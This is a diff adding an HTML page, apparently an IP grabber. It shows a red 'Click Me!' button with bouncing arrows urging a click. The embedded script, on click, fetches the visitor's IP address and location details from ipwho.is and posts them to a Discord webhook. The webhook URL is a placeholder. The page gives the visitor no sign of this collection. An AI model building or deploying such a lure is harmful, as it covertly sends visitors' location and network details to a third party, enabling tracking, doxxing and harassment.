@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Click Me!</title>
+<style>
+    body {
+        margin: 0;
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background: linear-gradient(to bottom, red, black);
+        font-family: Arial, sans-serif;
+        overflow: hidden;
+        position: relative;
+    }
+
+    button {
+        padding: 20px 40px;
+        font-size: 24px;
+        background-color: red;
+        color: white;
+        border: none;
+        border-radius: 10px;
+        cursor: pointer;
+        position: relative;
+        z-index: 2;
+    }
+
+    /* Arrow styling */
+    .arrow {
+        position: absolute;
+        width: 0;
+        height: 0;
+        border-left: 20px solid transparent;
+        border-right: 20px solid transparent;
+        border-bottom: 30px solid white;
+        animation: bounce 1s infinite;
+    }
+
+    .arrow1 { top: 20%; left: 50%; transform: translateX(-50%) rotate(0deg); }
+    .arrow2 { top: 40%; left: 50%; transform: translateX(-50%) rotate(0deg); }
+
+    @keyframes bounce {
+        0%, 100% { transform: translateX(-50%) translateY(0); }
+        50% { transform: translateX(-50%) translateY(10px); }
+    }
+</style>
+</head>
+<body>
+
+<div class="arrow arrow1"></div>
+<div class="arrow arrow2"></div>
+<button id="clickMe">Click Me!</button>
+
+<script>
+const webhookURL = "YOUR_DISCORD_WEBHOOK_URL"; // replace with your webhook URL
+
+document.getElementById("clickMe").addEventListener("click", async () => {
+    try {
+        // Fetch IP info from API
+        const response = await fetch("https://ipwho.is/");
+        const data = await response.json();
+
+        // Send data to Discord webhook
+        await fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                content: "IP Info:\n" + JSON.stringify(data, null, 2)
+            })
+        });
+
+        alert("Data sent!");
+    } catch (err) {
+        console.error(err);
+        alert("Error sending data");
+    }
+});
+</script>
+
+</body>
+</html>
